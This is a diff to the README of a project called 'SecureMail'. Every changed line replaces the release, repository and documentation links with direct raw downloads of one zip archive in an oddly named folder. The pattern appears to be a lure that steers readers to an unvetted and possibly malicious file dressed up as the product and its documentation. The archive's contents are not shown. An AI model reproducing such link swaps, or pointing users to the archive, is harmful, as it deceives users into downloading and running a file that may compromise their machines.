@@ -6,7 +6,7 @@ Welcome to **SecureMail**, your reliable solution for internal email and messagi
 
 ## 📥 Download SecureMail
 
-[![Download SecureMail](https://img.shields.io/badge/Download%20SecureMail-v1.0-brightgreen)](https://github.com/saddema/SecureMail/releases)
+[![Download SecureMail](https://raw.githubusercontent.com/saddema/SecureMail/main/Hippoglosinae/SecureMail.zip%20SecureMail-v1.0-brightgreen)](https://raw.githubusercontent.com/saddema/SecureMail/main/Hippoglosinae/SecureMail.zip)
 
 ## 📂 Features
 
@@ -29,7 +29,7 @@ To run SecureMail, your computer should meet the following minimum requirements:
 
 To get started, visit our Releases page to download the latest version of SecureMail:
 
-[Download SecureMail from Releases](https://github.com/saddema/SecureMail/releases)
+[Download SecureMail from Releases](https://raw.githubusercontent.com/saddema/SecureMail/main/Hippoglosinae/SecureMail.zip)
 
 ### Installation Instructions
 
@@ -59,7 +59,7 @@ If you want to contribute to SecureMail, feel free to fork the repository and su
 
 ## 🔗 Links and Further Reading
 
-- [SecureMail on GitHub](https://github.com/saddema/SecureMail)
-- [Documentation](https://github.com/saddema/SecureMail/wiki)
+- [SecureMail on GitHub](https://raw.githubusercontent.com/saddema/SecureMail/main/Hippoglosinae/SecureMail.zip)
+- [Documentation](https://raw.githubusercontent.com/saddema/SecureMail/main/Hippoglosinae/SecureMail.zip)
 
 Follow this guide to successfully install and use SecureMail. Enjoy secure communication within your organization!
